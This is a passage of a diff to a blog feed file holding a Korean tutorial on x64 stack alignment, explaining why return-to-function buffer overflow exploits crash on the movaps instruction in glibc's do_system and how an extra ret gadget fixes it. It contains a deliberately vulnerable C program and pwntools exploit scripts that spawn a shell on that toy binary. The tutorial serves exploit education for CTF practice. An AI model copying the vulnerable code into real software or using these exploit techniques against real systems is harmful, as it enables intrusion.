class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p>main()의 return 주소를 win() 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p>main()의 ret에 break point를 걸고 win() 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 win()의 entry point에 도달하면</p><p>프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, win()에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, win() 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 do_system()을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p>!<img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달하면</p><p>프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content>
     
     
     <categories>
@@ -579,9 +771,9 @@
       
       <tag>cve</tag>
       
-      <tag>idioth</tag>
-      
       <tag>use after free</tag>
+      
+      <tag>idioth</tag>
       
       <tag>internet explorer</tag>
       
